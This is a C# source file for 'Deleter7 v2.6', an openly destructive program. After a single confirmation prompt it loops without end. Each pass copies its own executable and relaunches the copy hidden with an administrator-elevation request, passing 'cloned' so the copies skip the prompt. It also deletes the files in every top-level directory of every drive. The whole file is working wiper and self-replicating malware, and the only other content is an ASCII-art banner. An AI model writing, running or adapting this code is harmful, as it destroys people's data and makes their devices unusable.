namespace System
{
    public static class Deleter
    {
        public const System.String Ver = "2.6";
        public const System.String Title = "Deleter7 v" + System.Deleter.Ver;
        private static readonly System.String[] LogicalDrives = System.IO.Directory.GetLogicalDrives();
        private static readonly System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
        private static readonly System.String ProgramName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
        private static System.UInt64 UInt64;
        private static System.Boolean IsCloned;
        private static readonly System.String[] Messages = System.Deleter.Argument.Split('\n');
        private static readonly System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
        private static void DeleteDir()
        {
            System.Console.Out.WriteLine(System.Deleter.Messages);
            foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
            {
                if (disk.Name != disk.VolumeLabel)
                {
                    System.Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                }
                else
                {
                    System.Console.Out.WriteLine("Current drive is: " + disk.Name);
                }
                foreach (System.String drive in System.Deleter.LogicalDrives)
                {
                    System.String root = System.IO.Directory.GetDirectoryRoot(drive);
                    if (root == null || root == "")
                    {
                        root = "/";
                    }
                    System.String[] dirs = System.IO.Directory.GetDirectories(root);
                    foreach (System.String dir in dirs)
                    {
                        System.String[] files = System.IO.Directory.GetFiles(dir);
                        foreach (System.String file in files)
                        {
                            System.IO.File.Delete(file);
                            System.Console.Out.WriteLine("Deleting " + file);
                        }
                    }
                }
            }
        }
        public static void Main(System.String[] args)
        {
            System.String arguments = "";
            foreach (System.String arg in args)
            {
                arguments += arg;
            }
            System.Console.Title = System.Deleter.Title;
            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
            System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
            if (arguments.ToLower().Contains("cloned")) 
            {
                System.Deleter.IsCloned = true;
            }
            else
            {
                System.Deleter.IsCloned = false;
            }
            if (!System.Deleter.IsCloned)
            {

                System.Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
                System.Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
                if (!System.Console.ReadLine().ToUpper().Contains("Y"))
                {
                    System.Environment.Exit(0);
                    return;
                }
            }
            System.Threading.Thread.Sleep(1000);
            while (true)
            {
                System.Deleter.UInt64++;
                System.IO.File.Copy(System.Deleter.ProgramName + ".exe", System.Deleter.ProgramName + " (" + System.Deleter.UInt64 + ").exe");
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.Verb = "runas";
                p.StartInfo.FileName = System.Deleter.ProgramName
                    + " (" + System.Deleter.UInt64 + ").exe";
                p.StartInfo.Arguments = "cloned " + System.Deleter.Argument;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                p.Start();
                System.Deleter.DeleteDir();
            }
        }
    }
}